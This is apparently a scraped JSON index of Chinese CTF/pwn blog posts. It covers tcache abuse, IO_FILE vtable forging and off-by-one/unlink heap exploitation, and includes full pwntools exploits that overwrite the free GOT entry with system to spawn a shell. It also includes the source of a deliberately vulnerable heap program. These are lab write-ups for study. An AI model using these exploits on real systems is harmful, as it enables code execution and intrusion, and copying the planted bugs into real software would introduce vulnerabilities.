准备好了以后我们通过脚本将题目PT_INTERP段修改，然后通过LD_PRELOAD指定我们需要的libc的路径即可。 实际操作我们以lonelywolf为例。 有一个很尴尬的事实就是，我找不到比赛提供的libc了。当时存了，但是没有了。 参考LD_PRELOAD的偷梁换柱之能","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"}]},{"title":"Tcache利用","slug":"Heap-Tcache利用","date":"2021-08-13T07:06:00.000Z","updated":"2021-08-16T07:33:16.483Z","comments":true,"path":"2021/08/13/Heap-Tcache利用/","link":"","permalink":"https://fuurinko.github.io/2021/08/13/Heap-Tcache%E5%88%A9%E7%94%A8/","excerpt":"","text":"Tcache 利用不是学习不是学习不是学习， 例题是lctf2018的easyheap。 漏洞点一个又明显又不明显的漏洞、来自于输入后会把chunk_ptr置为0。 然后联想到malloc的内存分配机制，如果我们malloc一个16*n+8型的chunk，由于ptmalloc的内存复用机制，我们可以利用这个置零的漏洞使得物理相邻的下一个chunk的prevsize位包括previnuse位为0。然后构造堆叠。 12345678910111213141516171819202122232425unsigned __int64 __fastcall sub_BEC(_BYTE *a1, int a2)&#123; signed int v3; // [rsp+14h] [rbp-Ch] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); v3 = 0; if ( a2 ) &#123; while ( 1 ) &#123; read(0, &amp;a1[v3], 1uLL); if ( a2 - 1 &lt; (unsigned int)v3 || !a1[v3] || a1[v3] == 10 ) break; ++v3; &#125; a1[v3] = 0; a1[a2] = 0;//loophole &#125; else &#123; *a1 = 0; &#125; return __readfsqword(0x28u) ^ v4;&#125; 然后又注意到我们最多只能分配十个堆块，除去需要填满Tcache的七个堆块，也就是我们只能分配十个相同大小的堆块。 在完成这道题之前我们需要先理解unsortedbin 泄漏libc的原理。 包括ciscn lonelywolf也是利用到了这一点。","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"}]},{"title":"调试器断点原理","slug":"调试器断点原理","date":"2021-08-10T07:57:53.000Z","updated":"2021-08-10T08:05:01.076Z","comments":true,"path":"2021/08/10/调试器断点原理/","link":"","permalink":"https://fuurinko.github.io/2021/08/10/%E8%B0%83%E8%AF%95%E5%99%A8%E6%96%AD%E7%82%B9%E5%8E%9F%E7%90%86/","excerpt":"","text":"1)review夹带私货的科普文 2）调试器断点 调试器可以给程序打断点是怎么回事呢？调试器相信大家都很熟悉，但是调试器可以给程序打断点是怎么回事呢，下面就让小编带大家一起了解吧。 调试器可以给程序打断点，其实就是程序以为自己出错了，大家可能会很惊讶程序怎么可能以为自己会出错呢？但事实就是这样，小编也感到非常惊讶。 这就是关于调试器可以给程序打断点的事情了，大家有什么想法呢，欢迎在评论区告诉小编一起讨论哦！","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"IO_FILE学习","slug":"io_file","date":"2021-08-09T07:44:00.000Z","updated":"2021-08-09T08:48:24.255Z","comments":true,"path":"2021/08/09/io_file/","link":"","permalink":"https://fuurinko.github.io/2021/08/09/io_file/","excerpt":"","text":"io_file学习笔记 0）reviewglibc定义了_IO_FILE这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的_IO_FILE_plus结构 结构源码如下 12345struct _IO_FILE_plus&#123; _IO_FILE file; IO_jump_t *vtable;&#125; 这个结构包含了一个叫vtable的指针，指向实现io函数各种功能的真正函数。 以fread为例子简述io_file结构调用的流程 freadfread真正功能的实现在子函数_IO_sgetn中。 下面是_IO_sgetn的源码。 12345678_IO_size_t_IO_sgetn (fp, data, n) _IO_FILE *fp; void *data; _IO_size_t n;&#123; return _IO_XSGETN (fp, data, n);&#125; 实际上也是先定义一堆变量然后内部再调用另外一个函数。 也就是_IO_XSGETN。 这个函数并不简单，它是_IO_FILE_plus.vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。 vtable也是一个指针，指向结构体_IO_jump_t _IO_jump_t源码如下 1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;; 这里vtable就像一个中转站，通过它调用_IO_jump_t中的各种函数。 比如说这里fread就是调用的_IO_file_xsgetn函数。 值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用。 12345678if (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) &#123; if (__underflow (fp) == EOF) break; continue; &#125; 函数源码如上，实现的是一个键盘输入。 实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。 伪造vtable在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。 那么应该如何伪造vtable呢？目前有两种思路。 一种是直接修改vtable中的指针，进行一个任意地址读写，第二种是覆盖 vtable 的指针，使其指向一段可控的内存空间，也就相当于伪造vtable。 在libc2.23以后的版本vtable不能被直接写入数据，所以只能用第二种方法–伪造vtable。 但是我们先从第一个方法来试一试。 示例来源于ctf-wiki 1234567891011int main(void)&#123; FILE *fp; long long *vtable_ptr; fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable vtable_ptr[7]=0x41414141 //xsputn printf(&quot;call 0x41414141&quot;);&#125; 这边利用的具体步骤比较直观。 遍历 _IO_list_all ，然后调用 _IO_2_1_stdout_ 下的 vtable 中 _setbuf 函数。 承接上文的思路，我们需要在某个可控内存伪造vtable，然后修改_setbuf函数为关键内容。 在这道题中，我们可以在vtable附近修改两个字节构造fake vtable，然后利用三个字节改_setbuf为one_gadget。 开头直接给出了sleep函数的真实地址，程序内存地址完全暴露，我们可以通过它找到exit调用的stdout的地址。 123456789101112131415161718192021222324252627282930313233343536pwndbg&gt; print _IO_2_1_stdin_$2 = &#123; file = &#123; _flags = -72540024, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 &#x27;\\000&#x27;, _shortbuf = &quot;&quot;, _lock = 0x7ffff7dcf8d0 &lt;_IO_stdfile_0_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7dcdae0 &lt;_IO_wide_data_0&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = &#x27;\\000&#x27; &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;&#125; 我们可以看到vtable的地址是0x7ffff7dca2a0。 然后我们需要在它附近伪造一个vtable。 伪造的vtable需要符合以下条件：1:fake_vtable + 0x58=libc_base+off_3 完整exp 12345678910111213141516171819202122232425from pwn import *context.log_level=&quot;debug&quot;libc=ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)p = process(&#x27;the_end&#x27;)libc_base = long(sleep_ad,16) - libc.symbols[&#x27;sleep&#x27;]one_gadget = libc_base + 0xf02b0vtables = libc_base + 0x3C56F8fake_vtable = libc_base + 0x3c5588target_addr = libc_base + 0x3c55e0for i in range(2): p.send(p64(vtables+i)) p.send(p64(fake_vtable)[i])for i in range(3): p.send(p64(target_addr+i)) p.send(p64(one_gadget)[i])p.sendline(&quot;exec /bin/sh 1&gt;&amp;0&quot;)p.interactive() 总结伪造vtable算是io_file中比较简单好懂的一点了，只要对数据结构稍微熟悉一点就能很快理解。然后伪造的方式和思路也比较直接，可以说是经典pwn思路了//// 下一章我们将学习FSOP，感觉难度会比伪造vtable高出不少，其实只要沉下心来看都不难，最难的目前来说还是那些高版本的防护的绕过了。 FSOP上一part我们学习了如何通过伪造vtable加上打one_gsdget来getshell，理解起来比较简单，实际操作也并不复杂，只要能找到fake vtable的位置并且正确理解one gadget的用法就好。 这一个part我们学习FSOP。 ps：不管是fsop还是后面的glibc2.24下的伪造vtable在ctf中的考察都较少。但是不能说不重要吧/// FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项","categories":[],"tags":[{"name":"other","slug":"other","permalink":"https://fuurinko.github.io/tags/other/"}]},{"title":"roputils使用tips","slug":"roputils","date":"2021-08-03T07:32:00.000Z","updated":"2021-08-03T07:43:37.423Z","comments":true,"path":"2021/08/03/roputils/","link":"","permalink":"https://fuurinko.github.io/2021/08/03/roputils/","excerpt":"","text":"做ret2dl的时候难免会偷懒使用工具。 但是这个工具并没有看起来那么和善。 就怎么使用utils包我都研究了一会儿，然后发现只需要import roputils然后把相对应的那个py脚本放到同一路径下就好。 但是紧接着第二问个问题，这个py脚本通篇是python2，而我日常无论哪个系统都是py3。 所以解决方式有2 将roputils转换为py3 ubuntu切换py版本 反正第一种就是用一个叫2to3的脚本。是py2自带的，使用需要先安装py2.7，我ubuntu18.04自带py2.7，所以就直接2to3 -w roputils.py 具体参数可以google。 然后又来了第三个问题。 来看我的报错。 1234567891011[+] Starting local process &#x27;./babystack&#x27;: pid 745Traceback (most recent call last): File &quot;babystack.py&quot;, line 23, in &lt;module&gt; rop = roputils.ROP(&#x27;./babystack&#x27;) File &quot;/home/fur1n/pwn/week1/roputils.py&quot;, line 440, in __init__ ELF.__init__(self, *args, **kwargs) File &quot;/home/fur1n/pwn/week1/roputils.py&quot;, line 85, in __init__ m = re.search(r&#x27;^\\s*(?P&lt;key&gt;[^:]+):\\s+(?P&lt;value&gt;.+)$&#x27;, line) File &quot;/usr/lib/python3.6/re.py&quot;, line 182, in search return _compile(pattern, flags).search(string)TypeError: cannot use a string pattern on a bytes-like object 这个功能好像并不会在byte前加b。。。 目前来说并没有发现解决方法。 所以只能尝试更换默认的py版本。具体可以google","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"patch'alarm","slug":"patch alarm","date":"2021-08-03T06:56:14.000Z","updated":"2021-08-03T07:32:55.996Z","comments":true,"path":"2021/08/03/patch alarm/","link":"","permalink":"https://fuurinko.github.io/2021/08/03/patch%20alarm/","excerpt":"","text":"比较弱智的一个操作，但是如果没注意到的话还是有一点点坑。 一般来说许多题都喜欢在main函数里加alarm。 alarm会导致调试的时候超时，如果没有解决的话基本不能调试。算最基础的的反调试手法了。 ps:关于超时的那个报错当时还好好研究了一会儿来着。就是一个sigxxx，sigalarm好像，然后默认返回中止程序。 解决方案也比较弱智。就是直接patch掉就好了。 ida都关了懒得上图了。","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"SummerTask","slug":"summertask","date":"2021-08-02T10:25:35.000Z","updated":"2021-08-03T07:33:08.545Z","comments":true,"path":"2021/08/02/summertask/","link":"","permalink":"https://fuurinko.github.io/2021/08/02/summertask/","excerpt":"","text":"1）Summer_Havard1) 考点unlink chunk overlapping off by one/null 2）源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include&lt;sys/stat.h&gt;#define MAX_IDX 100//the maximum number of songs which can be created#define MAX_SIZE 9999//the maximum size of your chunk//#define MAGICAL_IDX rand()%1000 // MAGICAL_IDX is a randow number in range of 0 - 1000.//#define MAGICAL_IDX 2 // MAGICAL_IDX is a randow number in range of 0 - 1000.//int MAGIC_NAME = 831;//the name of the target song to getshellstruct song // create the struct of song&#123; char *name; //the name of the song size_t size;//the size of the song&#125;;struct song *songlist[MAX_IDX];//set the max number of the songsvoid menu()&#123; puts(&quot;|----------------------------|&quot;); puts(&quot;| MY_PLAYER |&quot;); puts(&quot;|----------------------------|&quot;); puts(&quot;|1.DOWNLOAD THE SONG |&quot;); puts(&quot;|2.DELETE THE SONG |&quot;); puts(&quot;|3.LISTENING |&quot;); puts(&quot;|4.EDIT THE NAME OF THE SONG |&quot;); puts(&quot;|5.EXIT |&quot;); puts(&quot;|6.PWNED |&quot;); puts(&quot;|----------------------------|&quot;); puts(&quot;| ∧ ___ ∧ |&quot;); puts(&quot;| / ● ● | |&quot;); puts(&quot;| / - | |&quot;); puts(&quot;|----------------------------|&quot;);&#125;void download() //add a new heap includeing a size chunk and content chunk.&#123; int i; char buf[8];//the buffer of the read func . size_t size;//the size of the chunk. if (MAX_IDX &gt; 100) //set the range . &#123; puts(&quot; MEMORY EXCESSIVE LOAD &quot;); return; &#125; for (i = 0; i &lt; MAX_IDX; i++)//init the struct heap. &#123; if (!songlist[i]) &#123; songlist[i] = (struct song *)malloc(sizeof(struct song)); if (!songlist[i]) &#123; puts(&quot;ALLOCA ERROR&quot;); exit(-1); &#125; //error printf(&quot;SIZE OF THE SONG :&quot;); scanf(&quot;%ld&quot;,&amp;size); if (size &gt; 0 &amp;&amp; size &lt; MAX_SIZE) &#123; songlist[i]-&gt;name = (char *)malloc(size);//add a chunk to store the struct &#x27;size&#x27; . if (!songlist[i]-&gt;name) &#123; puts(&quot;ALLOCA ERROR&quot;); exit(-1); &#125;//error printf(&quot;NAME :&quot;); read(0,songlist[i]-&gt;name,size); //scanf(&quot;%c&quot;,&amp;(songlist[i]-&gt;name)); puts(&quot;DOWNLOAD SUCCESFULLY&quot;); break; &#125; else &#123; printf(&quot;(INVALID SIZE)\\n&quot; ); break; &#125; &#125; &#125;&#125;void delete()//delete&#123; int idx; char buf[4]; printf(&quot;INDEX :&quot;); read(0, buf, 4); idx = atoi(buf); if (idx &lt; 0 || idx &gt;= 100) &#123; puts(&quot;INVALID INDEX!!!&quot;); exit(0); &#125; if (songlist[idx]) &#123; free(songlist[idx]-&gt;name); free(songlist[idx]); puts(&quot;DELETE SUCCESFULLY&quot;); &#125; else &#123; puts(&quot;THE SONG DOESN&#x27;T EXIST!&quot;); &#125;&#125;void listen()&#123; char buf[4]; int idx; printf(&quot;INDEX :&quot;); read(0, buf, 4); idx = atoi(buf); if (idx &lt; 0 || idx &gt; 100) &#123; puts(&quot;INVALID INDEX!!!&quot;); exit(0); &#125; if (songlist[idx]) &#123; printf(&quot;YOU ARE LINTENING TO %s &quot;,songlist[idx]-&gt;name); &#125; else &#123; puts(&quot;THE SONG DOESN&#x27;T EXIST!&quot;); &#125;&#125;void edit()&#123; char buf[8]; int idx; size_t size; puts(&quot;NOW YOU CAN CHANGE YOUR SONG&#x27;S NAME!!&quot;); printf(&quot;INDEX OF YOUR TERGGER SONG: &quot;); scanf(&quot;%d&quot;,&amp;idx); if(idx &lt; 0 || idx &gt; 100) &#123; puts(&quot;INVALID INDEX!!!&quot;); exit(0); &#125; printf(&quot;SIZE OF THE SONG :&quot;); read(0, buf, 8); size = atoi(buf); songlist[idx]-&gt;name = (char *)malloc(size);//add a chunk to store the struct &#x27;size&#x27; . if (!songlist[idx]-&gt;name) &#123; puts(&quot;ALLOCA ERROR&quot;); exit(-1); &#125;//error if (songlist[idx]) &#123; puts(&quot;CHANGE YOUR SONG NAME NOW :&quot;); read(0,songlist[idx]-&gt;name,size+1); puts(&quot;EDIT SUCCESFULLY&quot;); &#125; else &#123; puts(&quot;THE SONG DOESN&#x27;T EXIST!&quot;); &#125;&#125;int main()&#123; int i = 0; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); char buf[4]; while (1) &#123; menu(); puts(&quot;YOUR CHOISE :&quot;); read(0, buf, 4); //scanf(&quot;%d&quot;,&amp;i); switch (atoi(buf)) &#123; case 1: download(); sleep(1); break; case 2: delete(); sleep(1); break; case 3: listen(); sleep(1); break; case 4: edit(); sleep(1); break; case 5: exit(0); sleep(1); break; case 6: for(i;i&lt;20;i++) &#123; printf(&quot;?????\\n&quot;); sleep(1); &#125; break; default: puts(&quot;INVALID CHOISE!!!&quot;); break; &#125; &#125; return 0;&#125; 3）解题分析1）漏洞点分析1234567rin@fur1n:~/pwn$ checksec summer[*] &#x27;/home/rin/pwn/summer&#x27; Arch: amd64-64-little RELRO: NO RELRO Stack: Canary found NX: NX enabled PIE: NO PIE 无pie，无relro 123printf(&quot;NAME :&quot;); read(0, **((void ***)&amp;songlist + i), size + 1); puts(&quot;DOWNLOAD SUCCESFULLY&quot;); 一个很直观的漏洞点，read的时候会比原本规定的多读入一个字节，造成off by one。 2）漏洞利用分析这种堆题一个比较经典的思路就是悬垂指针的利用。利用fake chunk来修改指针造成任意地址写。但众所周知，在2.26后的对于prev_size的检测为无脑chunk overlapping增加了难度。所以这里分别将程序以libc2.23和libc2.27，2.29执行，并且分别分析对应的漏洞利用。 1) level0-baby_overlapping既然是单字节溢出，我们可以考虑修改chunk 的prev_size位后，控制这个chunk的指针，将它劫持到free或者show的got表地址然后leak libc基址。 核心利用思路与ctf wiki关于chunk overlapping上面的示例5一样。 申请两个chunk，然后编辑chunk0，利用off by one覆盖chunk1的prev_size位，然后释放chunk1，由于悬垂指针，我们可以重新add一个0x40大小的chunk1，用free的got表的地址覆盖指向chunk1的指针，再利用show（1）功能打印将它出来，这就完成了内存泄露。 然后利用free的真实地址进而计算出system的真实地址，继而在free的got的位置将free的got表值覆盖为system的地址，通过之前构造的chunk1的content中的&quot;/bin/sh&quot;进行系统调用并getshell。 exp如下。具体的细节说明在注释中。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]r = process([&quot;./glibc/lib00/lib/x86_64-linux-gnu/ld-2.23.so&quot;, &quot;./summer_1&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./glibc/lib00/lib/x86_64-linux-gnu/libc.so.6&quot;&#125;)#switch the verion of libccontext.log_level = &#x27;debug&#x27;libc = ELF(&#x27;./glibc/lib00/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)elf = ELF(&#x27;./summer_1&#x27;)def add(size,content): r.sendline(&quot;1&quot;) r.sendafter(&quot;:&quot;,str(size)) r.sendafter(&quot;:&quot;,content)def delete(idx): r.sendline(&quot;2&quot;) r.sendafter(&quot;:&quot;,str(idx))def show(idx): r.sendline(&quot;3&quot;) r.sendafter(&quot;:&quot;,str(idx))def edit(idx,content): r.sendline(&quot;4&quot;) r.sendafter(&quot;:&quot;,str(idx)) r.sendafter(&quot;:&quot;,str(content))def dbg(): gdb.attach(r) pause()free_got = 0x4036E8 add(0x18, b&quot;aaaa&quot;) # chunk0add(0x10, b&quot;bbbb&quot;) # chunk1edit(0, b&quot;/bin/sh\\x00&quot; + b&quot;a&quot; * 0x10 + b&quot;\\x41&quot;)#construct thestruction of chunk0 for the application later.#Especially the str(&#x27;/bin/sh&#x27;)to trigger the system execve()#dbg()delete(1)#free chunk1,then the 41 will become the size of chunk1add(0x20, p64(0) * 4 + p64(0x20) + p64(elf.got[&#x27;free&#x27;])) #overlap the chunk1show(1) free_addr = u64(r.recvuntil(&quot;DOWNLOAD SUCCESFULLY&quot;)[:-5].ljust(8, &quot;\\x00&quot;))libc_base = free_addr - libc.symbols[&#x27;free&#x27;]print(hex(libc_base))system_addr = libc_base + libc.symbols[&#x27;system&#x27;]#leakedit(1, p64(system_addr))show(1)delete(0)r.interactive() 2）level1-eazy_unlink虽然直接修改prevsize位造成堆叠非常简单，但是我们也可以利用unlink中的思路，在chunk中构造fakechunk，通过off by one/null 触发unlink造成堆叠。这并不是特地绕远路，在level2中我们无法直接单字节溢出，必须用到ulnink。 那为什么利用unlink能构造堆叠呢？详见extra。 构造出堆叠以后的利用就相对模版化，因为保护同样还是只有nx和canary，我们可以很方便地同无保护的堆叠一样修改chunk的指针为free的got表地址来泄露程序的内存布局，然后再用system的got表值把free的got表值覆盖。 具体的细节分析如下。 1）堆风水构造ps：程序会先分配一个0x20的chunk储存size。但是效果是一样的 1234add(0xf8,b&#x27;aaaa&#x27;)#chunk0，用来写system的参数add(0xf8,b&#x27;bbbb&#x27;)#chunk1#在其中伪造fake chunkadd(0xf8,b&#x27;cccc&#x27;)#chunk2#触发unlinkadd(0xf8,b&#x27;dddd&#x27;)#chunk3,用来防止free chunk 与 top chunk 合并 连续申请4个chunk，大小都是0xf8。 0xf8这个数字的来源如何？ 分配0xf8的content，实际在内存中是0x101。 为什么是0x101？ 首先我们要实现空字节溢出，一般来说是溢出一个/x00。如果chunk的size过小，先不说free以后分配的chunk的种类，单是空字节溢出也会使得size变成0，这里只有当原本的size是三位数的时候溢出才有意义。 其次还涉及到prec size的在内存的位置问题。 详细分析参见exrta。 2）利用off by null 进行unlink12345678payload = p64(0x110)#prev_sizepayload += p64(0xf1)#sizepayload += p64(next_chunk_addr - 0x18)#fdpayload += p64(next_chunk_addr - 0x10)#bkpayload += b&#x27;a&#x27;*0xd0#堆的大小减去伪造的heap头，0x100-0x8*5payload += p64(0xf0)#next_prev_size，利用了off by null的单字节溢出edit(1,payload)delete(2)#触发unlink、，造成堆叠 这里开始进行unlink操作。 首先确定fd，bk地址。确定地址的思路事实上就是之前提到过的，extra部分中对于unlink利用的概述。 所以我们使用的是next_chunk_addr - 0x18/0x10。 Nextchunk addr的地址则是chunk2 ptr。可以通过调试得到具体的值即0x6024b0 并且我们通过空字节溢出使得next chunk的prev size位为F0，它将prev inuse改成了00，使得程序认为chunk1是一个free chunk，当我们释放chunk2，就会触发chunk1的unlink。 而且根据unlink的原理，这段exp使得这个fake chunk的地址向下减少了0x18.(ps:64bit下） 意味着chunk1已经和chunk2形成了堆叠。 具体还是参见extra 堆叠的形成意味着我们可以通过更改chunk1的内容改变它的指针。 1234payload1 = p64(0xf8)#sizepayload1 = p64(free_got_addr)#利用堆叠更改chunk1的指针edit(1,payload1）show（1）#此时打印出chunk1的内容，即为free的真实地址 3）完整exp：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]r = process([&quot;./glibc/lib00/lib/x86_64-linux-gnu/ld-2.23.so&quot;, &quot;./summer_1&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./glibc/lib00/lib/x86_64-linux-gnu/libc.so.6&quot;&#125;)#switch the verion of libccontext.log_level = &#x27;debug&#x27;libc = ELF(&#x27;./glibc/lib00/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)elf = ELF(&#x27;./summer_1&#x27;)def add(size,content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.sendlineafter(&quot;:&quot;,str(size)) r.sendlineafter(&quot;:&quot;,content)def delete(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.sendlineafter(&quot;:&quot;,str(idx))def show(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.sendlineafter(&quot;:&quot;,str(idx))def edit(idx,content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;4&quot;) r.sendlineafter(&quot;:&quot;,str(idx)) r.sendlineafter(&quot;:&quot;,str(content))def dbg(): gdb.attach(r) pause()unlink_addr = 0x6024b0free_got_addr = 0x4036E8next_chunk_addr = unlink_addradd(0xf8,b&#x27;aaaa&#x27;)#chunk0，用来写system的参数add(0xf8,b&#x27;bbbb&#x27;)#chunk1#在其中伪造fake chunkadd(0xf8,b&#x27;cccc&#x27;)#chunk2#触发unlinkadd(0xf8,b&#x27;dddd&#x27;)#chunk3,用来防止free chunk 与 top chunk 合并payload = p64(0x100)#prev_sizepayload += p64(0xf1)#sizepayload += p64(next_chunk_addr - 0x18)#fdpayload += p64(next_chunk_addr - 0x10)#bkpayload += b&#x27;a&#x27;*0xd0#堆的大小减去伪造的heap头，0x110-0x8*5payload += b&#x27;0xf0&#x27;#next_prev_sizeedit(1,payload)delete(2)#触发unlink，造成堆叠payload1 = p64(0xf8)#sizepayload1 += p64(free_got_addr)#利用堆叠更改chunk1的指针为free的got表edit(1,payload1)show(1)#此时打印出chunk1的内容，即为free的真实地址#leakfree_addr = u64(r.recvuntil(&quot;DOWNLOAD SUCCESFULLY&quot;)[:-5].ljust(8,&quot;\\x00&quot;))libc_base = free_addr - libc.symbols[&#x27;free&#x27;]print(hex(libc_base))system_addr = libc_base + libc.symbols[&#x27;system&#x27;]edit(1,p64(system_addr))#更改free的got表值为system函数的真实地址edit(0,&quot;/bin/sh\\x00&quot;)#将chunk0的内容填充为binsh，作为下面执行函数的参数delete(0)#由于free的got表值已经被篡改为system，所以调用free即调用system。r.interactive() 3）level2-harder_unlink2.29以后glibc代码中增加了对于prev_size的检测 123456789/* consolidate backward */if (!prev_inuse(p)) &#123; prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;); unlink_chunk (av, p);&#125; 来对抗单字节溢出。 检测的内容也很好理解，如果当chunk的size位如果与next chunk的prev_size位不相等即报错。这个检测使我们很难直接通过单字节溢出来控制prev size位。 那么我们应该如何绕过它呢？ 很自然地我们想到可以更改next chunk的prev_size，但是仔细想想就会发现这是个无尽套娃。基本不可能。 既然想不出简单的办法绕过，那我们就干脆不修改prev_size了。 一般的poison null byte是通过伪造fd和bk位来伪造fake chunk的地址，使得地址向低地址移动，既然现在不好控制，那么如果内存上有现成的fd和bk供我们利用呢？我们是不是可以利用它们来控制fake chunk—-确有其事，比如说largebin chunk的fd_nextsize,bk_nextsize。 我们可以以fd_nextsize作为fake chunk的fd，bk_nextsize作为fake chunk的bk。 由于fd_nextsize和bk_nextsize用于指向第一个与自己大小不同的chunk，当largebin中只有一个chunk，这两个指针都是指向chunk本身。 具体见extra部分中对于largebin的概述。 利用方式则是： 申请两个较大的chunk后再释放，要求chunk进入unsorted bin。 将一个largebin申请回来。 在这个largebin chunkA内构造fake。在原本chunkA的bk位置写fake chunk的size位，也就是将fake chunk构建在chunk+0x10处。 然后处理fake chunk的fd和bk位。目的是以chunkA的fd_nextsize指针作为fake chunk的fd位，bk_nextsize指针作为fake chunk的bk。首先是fake chunk的fd位，把chunkA的fd_nextsize指针覆盖到一个可以控制的其bk位的 chunkB上，再伪造chunkB的bk位使其指向fake chunk即可。 对于fake chunk的bk位，按照检测，要触发unlink，bk必须指向fake chunk本身，也就是chunkA+0x10处，这里我们可以利用fastbin的特性，将一个fastbin chunk作为跳板绕过。 fake chunk构造完成后直接free chunkA，触发unlink，造成堆叠。可以利用它leak，然后改free got表。 我们通过exp和图示来理清楚。 由于并没有开启地址随机化，所以地址的覆盖并不需要部分覆写。 前三步可以用下面的图表来说明： 首先将tcache填满。 1234567891011for a in range(7): add(0x1000,b&#x27;fill&#x27;) delete(a)for b in range(7): add(0x1020,b&#x27;fill&#x27;) delete(b)for c in range(7): add(0x20,b&#x27;fill&#x27;) delete(c) 然后让chunk21成为largebin chunk 12345add(0x500,b&#x27;largebin chnuk0&#x27;)#chunk21add(0x20,b&#x27;top&#x27;)#chunk22delete(21)add(0x1000,b&#x27;functional gadgets&#x27;)#chunk23,to push the chunk21 to largebin#有关这一步的具体说明可以看Tcache部分。 至此我们获得了一个0x500大小的largebin chunkA，此时这个chunkA的状态还是free。 然后我们要在chunkA的header开始伪造fake chunk。 这是比较关键的一部分。利用到了large bin遗留在内存上的fd_nextsize 和 bk_nextsize 指针。以 fd_nextsize 为 fake_chunk 的 fd，bk_nextsize 为 fake_chunk 的 bk。但是我们首先需要绕过unlink的安全检测，即之前说过的Fd-&gt;bk = p, BK-&gt;fd = p ps：我们伪造的fake chunk是smallbin chunk，在bin中也是由双向链表维护。 我们分别为FD-&gt;bk = p和BK-&gt;fd = p进行绕过 首先是FD-&gt;bk = p的绕过。 回忆一下之前level1我们绕过的方法论，也就是： 1FD-&gt;bk = p ==&gt; bk_nextsize = p 所以我们的目的是让bk_nextsize指向fake chunk。 BK-&gt;fd = p的绕过同理，等价于构造fd_nextsize，使它指向fake chunk。 但是有趣的是此时我们的largebin中只有一个largebin chunk，它的fd_nextsize,bk_nextsize本身就是指向chunk本身的。然而这样没有任何意义，我们需要修改fd_nextsize到我们需要的地方。 这便又是问题所在。我们需要找到一个方法使得修改fd_nextsize的同时又能绕过检测。 